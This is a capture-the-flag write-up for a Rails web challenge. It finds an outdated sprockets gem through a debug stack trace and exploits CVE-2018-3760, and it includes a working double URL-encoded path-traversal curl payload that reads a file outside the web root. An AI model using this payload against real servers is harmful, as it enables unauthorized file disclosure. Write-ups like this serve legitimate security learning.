# Country(200):  United Kingdom
----------
Description:  Hack this site and get the flag!

/tmp/flag.lol
http://52.9.13.75:3000
----------
Hint:  no
----------
Attachments:  []

~!|----------|!~

so logging into the site you can see that a fresh rails installation is present.  Which means the default route handler prints out debug information, and the main page shows :

```
Rails version: 5.0.7
Ruby version: 2.5.1 (x86_64-linux)
```

thats cool, however 5.0.7 is recent and has no cve's available yet.  The vulnerability has to be in the gem dependencies

so by trying a bunch of stuff, lets look at the failures for a random page request in stack and see if we can find some vulnerable dependencies that get called through the router.

```
actionpack (5.0.7) lib/action_dispatch/middleware/debug_exceptions.rb:53:in `call'
web-console (3.7.0) lib/web_console/middleware.rb:135:in `call_app'
web-console (3.7.0) lib/web_console/middleware.rb:22:in `block in call'
web-console (3.7.0) lib/web_console/middleware.rb:20:in `catch'
web-console (3.7.0) lib/web_console/middleware.rb:20:in `call'
actionpack (5.0.7) lib/action_dispatch/middleware/show_exceptions.rb:31:in `call'
railties (5.0.7) lib/rails/rack/logger.rb:36:in `call_app'
railties (5.0.7) lib/rails/rack/logger.rb:24:in `block in call'
activesupport (5.0.7) lib/active_support/tagged_logging.rb:69:in `block in tagged'
activesupport (5.0.7) lib/active_support/tagged_logging.rb:26:in `tagged'
activesupport (5.0.7) lib/active_support/tagged_logging.rb:69:in `tagged'
railties (5.0.7) lib/rails/rack/logger.rb:24:in `call'
sprockets-rails (3.2.1) lib/sprockets/rails/quiet_assets.rb:13:in `call'
actionpack (5.0.7) lib/action_dispatch/middleware/request_id.rb:24:in `call'
rack (2.0.5) lib/rack/method_override.rb:22:in `call'
rack (2.0.5) lib/rack/runtime.rb:22:in `call'
activesupport (5.0.7) lib/active_support/cache/strategy/local_cache_middleware.rb:28:in `call'
actionpack (5.0.7) lib/action_dispatch/middleware/executor.rb:12:in `call'
actionpack (5.0.7) lib/action_dispatch/middleware/static.rb:136:in `call'
rack (2.0.5) lib/rack/sendfile.rb:111:in `call'
railties (5.0.7) lib/rails/engine.rb:522:in `call'
puma (3.12.0) lib/puma/configuration.rb:225:in `call'
puma (3.12.0) lib/puma/server.rb:658:in `handle_request'
puma (3.12.0) lib/puma/server.rb:472:in `process_client'
puma (3.12.0) lib/puma/server.rb:332:in `block in run'
puma (3.12.0) lib/puma/thread_pool.rb:133:in `block in spawn_thread'

```

the interesting one turns out to be `sprockets` that version has a recent vulnerability out for it for path traversal.  Boom lets exploit it

CVE-2018-3760
https://blog.heroku.com/rails-asset-pipeline-vulnerability
https://github.com/rails/sprockets/commit/c09131cf5b2c479263939c8582e22b98ed616c5f

http://52.9.13.75:3000/assets/file:%2f%2f//usr/src/blog/app/assets/images/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/tmp/flag.lol

Just getting the absolute path directly triggers a different check.  

Tricking it into thinking that the path is actually inside of the current directory triggers another check.

Url encoding the relative part triggers a different check still.

Url encoding the relative part again is the ticket, and we are in!


thats the ticket 

```
➜  ctf git:(master) ✗ curl http://52.9.13.75:3000/assets/file:%2f%2f//usr/src/blog/app/assets/images/%252e%252e%2F%252e%252e%2F%252e%252e%2F%252e%252e%2F%252e%252e%2F%252e%252e%2F%252e%252e/tmp/flag.lol
CK{3ac3d4fd3a4eb943de47b32793bb954d50a35c83}
```